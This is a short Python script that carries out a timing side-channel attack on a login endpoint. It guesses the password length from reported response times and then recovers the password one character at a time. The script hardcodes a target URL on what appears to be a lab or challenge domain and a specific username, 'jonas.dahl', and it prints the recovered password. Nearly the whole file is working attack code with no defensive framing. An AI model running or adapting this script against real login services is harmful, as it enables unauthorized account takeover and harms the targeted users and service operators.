import requests
import json


def determine_password_size(username, target_url):
    accumulated_time = 0
    guessed_length = 0
    while True:
        guess_data = json.dumps({"username": username, "password": "A" * guessed_length})
        headers = {"Content-Type": "application/json"}
        response = requests.post(target_url, data=guess_data, headers=headers)
        time_taken = response.json().get("total_time", 0)

        if time_taken > accumulated_time:
            return guessed_length, time_taken
        
        guessed_length += 1
        accumulated_time = time_taken

def infer_password(username, target_url, charset, password_size, max_response_time):
    found_password = ""

    for index in range(password_size):
        char_found = ""
        for char in charset:
            guess = found_password + char + "_" * (password_size - len(found_password) - 1)
            guess_payload = json.dumps({"username": username, "password": guess})
            headers = {"Content-Type": "application/json"}

            response = requests.post(target_url, data=guess_payload, headers=headers)
            try:
                time_taken = response.json().get("total_time", 0)
            except:
                print("Potential success detected.")
                return guess

            if time_taken > max_response_time:
                max_response_time = time_taken
                char_found = char
                break

        found_password += char_found

    return found_password

if __name__ == "__main__":
    login_endpoint = "https://portal.regjeringen.uiaikt.no/login"
    allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    target_user = "jonas.dahl"

    pwd_length, response_time = determine_password_size(target_user, login_endpoint)
    discovered_pwd = infer_password(target_user, login_endpoint, allowed_chars, pwd_length, response_time)
    print(f"Password for {target_user} is: {discovered_pwd}")
